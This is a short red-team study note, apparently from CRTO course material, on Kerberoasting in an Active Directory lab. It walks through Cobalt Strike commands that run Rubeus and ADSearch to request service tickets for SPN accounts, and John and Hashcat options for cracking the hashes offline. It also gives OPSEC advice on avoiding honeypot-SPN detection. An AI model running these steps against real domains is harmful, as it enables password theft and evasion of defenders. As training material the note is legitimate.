
Kerberoasting is a technique for requesting [[Ticket Granting Service (TGS)]] for services running under the context of domain accounts and cracking them offline to reveal their plaintext passwords.

Rubeus `kerberoast` can be used to perform the kerberoasting.  Running it without further arguments will roast every account in the domain that has a [[Service Principal Name (SPN)]] (excluding krbtgt).

## 🖊️ via Cobalt Strike

1) Kerberoast every account (not OPSEC)
   
   `beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /simple /nowrap`

2) These hashes can be cracked offline to recover the plaintext passwords for the accounts.  Use `--format=krb5tgs --wordlist=wordlist hashes` for  [[JohnTheRipper]] or `-a 0 -m 13100 hashes wordlist` for [[Hashcat]] .

⚠  There is some hash format incompatibility with john.  Removing the SPN so it became: `$krb5tgs$23$*mssql_svc$dev.cyberbotic.io*$6A9E[blah]` seemed to address the issue.

3) Roasting every account is very noisy and not OPSEC, a much safer approach is to enumerate possible candidates first and roast them selectively.  This LDAP query will find domain users who have an SPN set.

`beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName`

4) Once you pick a user, roast them individually

`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap`




### ⚠ Opsec

By default, Rubeus will roast every account that has an SPN.  Honey Pot accounts can be configured with a "fake" SPN, which will generate a 4769 event when roasted.  Since these events will never be generated for this service, it provides a high-fidelity indication of this attack.


### Properties
---
📆 created   {{18-02-2024}} 15:15
🏷️ tags: #redteam #crto 

---

